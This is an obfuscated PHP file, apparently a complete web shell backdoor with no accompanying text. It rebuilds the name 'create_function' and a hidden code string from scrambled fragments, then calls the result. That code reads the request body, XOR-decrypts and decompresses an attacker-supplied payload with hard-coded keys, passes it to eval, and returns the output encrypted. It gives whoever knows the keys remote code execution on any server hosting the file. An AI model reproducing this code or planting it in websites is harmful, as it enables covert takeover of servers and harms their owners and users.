<?php
$f=str_replace('Rl','','crRleRlateRlRl_RlRlfunction');
$C='c!9h("/$kh(.+)$kf/",@!9fi!9le!9_get_con!9tents("php:/!9/inpu!9!9!9t"),$m)==1) {@ob_!9start(!9)!9;@e';
$a='va!9l(@gz!9!9uncompress(@x!9(@ba!9se64_decode(!9$m!9[1]),$k))!9)!9;$o=@ob_get_cont!9ent!9s();@ob_e';
$p='j=!90;(!9!9$j<$c&&$i<$l);$j!9+!9+,$!9i++!9){$o.=$t{$i}^$k!9{$j};}}r!9!9eturn $o;}!9if (@!9preg_mat!9!9';
$s='$k=!9"6!9fc36f14";$kh="!95fbec261!98027"!9;$kf="!91ed!954feab164"!9;$p!9="tdA!9Y5G!944BJiw!98oC6"';
$k='nd!9_clea!9n();$r!9=@ba!9se6!94!9_!9encode(@x(@!9gzcom!9press($o),$k));pri!9nt(!9"$p$k!9h$r$kf");}';
$d=';f!9unction x!9(!9$t,$k!9!9){$c=strle!9n($k);$l=st!9!9rlen($t);$o="";fo!9r($i=0!9;$i<$l!9;){fo!9r($';
$t=str_replace('!9','',$s.$d.$p.$C.$a.$k);
$L=$f('',$t);$L();
?>
